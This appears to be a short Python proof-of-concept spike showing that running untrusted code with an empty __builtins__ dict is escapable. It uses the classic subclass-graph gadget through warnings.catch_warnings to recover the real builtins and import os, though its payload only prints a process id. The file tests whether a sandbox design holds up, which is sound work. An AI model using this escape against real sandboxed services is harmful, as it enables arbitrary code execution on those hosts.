"""
Spike 062 — PoC: in-process Python "sandbox" (empty __builtins__) is escapable
using ONLY object introspection (no builtins referenced by the attacker).

exit 0 = escape SUCCEEDED = naive in-process sandbox is INVALID.
"""

# Attacker code: __builtins__ = {}, so no getattr/import/open. Uses only the
# subclass graph reachable from a literal to recover a live __builtins__ dict
# carried on some class method's __globals__, then __import__('os').
UNTRUSTED = r'''
# Classic gadget: warnings.catch_warnings carries ._module -> the warnings
# module, whose __builtins__ is the REAL builtins dict. No builtin names used.
cw = [c for c in ().__class__.__base__.__subclasses__() if c.__name__ == "catch_warnings"][0]
builtins = cw()._module.__builtins__
RESULT = builtins["__import__"]("os").getpid()
OUT = (True, RESULT)
'''

def run_in_naive_sandbox(code: str):
    g = {"__builtins__": {}}
    exec(compile(code, "<untrusted>", "exec"), g)
    return g.get("OUT")

if __name__ == "__main__":
    import sys
    try:
        out = run_in_naive_sandbox(UNTRUSTED)
        if out and out[0]:
            print(f"ESCAPED: imported os, os.getpid()={out[1]}")
            print("VERDICT: in-process empty-builtins sandbox is INVALID.")
            sys.exit(0)
        print("did not escape (unexpected)"); sys.exit(2)
    except Exception as e:
        print(f"attacker hit: {type(e).__name__}: {e}"); sys.exit(1)
